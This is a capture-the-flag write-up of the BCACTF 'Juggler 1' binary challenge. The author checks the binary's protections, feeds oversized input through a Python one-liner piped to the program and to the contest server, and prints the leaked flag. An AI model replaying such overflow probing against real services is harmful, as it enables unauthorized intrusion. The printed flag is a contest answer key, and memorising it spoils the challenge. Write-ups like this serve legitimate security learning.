# Juggler 1 - 100 points
## Description
My friend here has got some issues... Mainly, he can't stop juggling.
P.S Dockerfile is provided but not necessary for Juggler

### Given assets
- `chall` - executable
- `nc challs.bcactf.com 32250` - string for connection
- `Dockerfile` - Dockerfile of the environment in which the exec is running

---
`checksec`
```shell
pwn checksec chall
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
All protections are enabled.

Running the executable
```shell
./chall
P.S the juggler animation is kind of tilted so you might need to look at it sideways.

Please help me, I am the juggler, but I can't stop juggling.
Give me something for my left hand (not too heavy though please, I injured it)
(or QUIT to quit):
> ball
Give me something for my right hand:
> ball
Watch this!-----------------------------------------=--||
                    ball 3----\     __
                             O-|---<__
                    ball 3----/
-----------------------------------------=--||
                         3----\     __
                   ball      O-|---<__
                    ball 3----/
-----------------------------------------=--||
                    ball 3----\     __
                   ball      O-|---<__
                         3----/
-----------------------------------------=--||
                    ball 3----\     __
                             O-|---<__
                    ball 3----/
-----------------------------------------=--||
                         3----\     __
                   ball      O-|---<__
                    ball 3----/
Please help me, I am the juggler, but I can't stop juggling.
Give me something for my left hand (not too heavy though please, I injured it)
(or QUIT to quit):
>
```
The challenge is hinting us for the left hand. So I tried to feed it with a big input.

```shell
python -c 'print("A"*1024 + "\n" + "A"*1024 + "\n")' | ./chall
```
And the program began an infinite loop. Maybe because the input is being read by a 
number of chars at a time, maybe 16.

But it strangely printed the local flag.

```shell
> Give me something for my right hand:
> Watch this!-----------------------------------------=--||
 AAAAAAAAAAAAAAAAAAAAAAA 3----\     __
                             O-|---<__
             AAAAAAAAAAA 3----/
-----------------------------------------=--||
                         3----\     __
            AAAAAAAAAAA      O-|---<__
 AAAAAAAAAAAAAAAAAAAAAAA 3----/
-----------------------------------------=--||
             AAAAAAAAAAA 3----\     __
AAAAAAAAAAAAFLAG{JUGGLER}
      O-|---<__
                         3----/
-----------------------------------------=--||
AAAAAAAAAAAAFLAG{JUGGLER}
 3----\     __
                             O-|---<__
             AAAAAAAAAAA 3----/
-----------------------------------------=--||
                         3----\     __
            AAAAAAAAAAA      O-|---<__
AAAAAAAAAAAAFLAG{JUGGLER}
 3----/
```

So I sent it to the server.
```shell
python -c 'print("A"*1024 + "\n" + "A"*1024 + "\n")' | nc challs.bcactf.com 32250
P.S the juggler animation is kind of tilted so you might need to look at it sideways.

Please help me, I am the juggler, but I can't stop juggling.
Give me something for my left hand (not too heavy though please, I injured it)
(or QUIT to quit):
> Give me something for my right hand:
> Watch this!-----------------------------------------=--||
 AAAAAAAAAAAAAAAAAAAAAAA 3----\     __
                             O-|---<__
             AAAAAAAAAAA 3----/
-----------------------------------------=--||
                         3----\     __
            AAAAAAAAAAA      O-|---<__
 AAAAAAAAAAAAAAAAAAAAAAA 3----/
-----------------------------------------=--||
             AAAAAAAAAAA 3----\     __
AAAAAAAAAAAAbcactf{juGGLy_Sup3R_JUgGLY_81520b089934c}      O-|---<__
                         3----/
-----------------------------------------=--||
AAAAAAAAAAAAbcactf{juGGLy_Sup3R_JUgGLY_81520b089934c} 3----\     __
                             O-|---<__
             AAAAAAAAAAA 3----/
-----------------------------------------=--||
                         3----\     __
            AAAAAAAAAAA      O-|---<__
AAAAAAAAAAAAbcactf{juGGLy_Sup3R_JUgGLY_81520b089934c}	 3----/
Please help me, I am the juggler, but I can't stop juggling.^C⏎
```
Voilá.

`bcactf{juGGLy_Sup3R_JUgGLY_81520b089934c}`
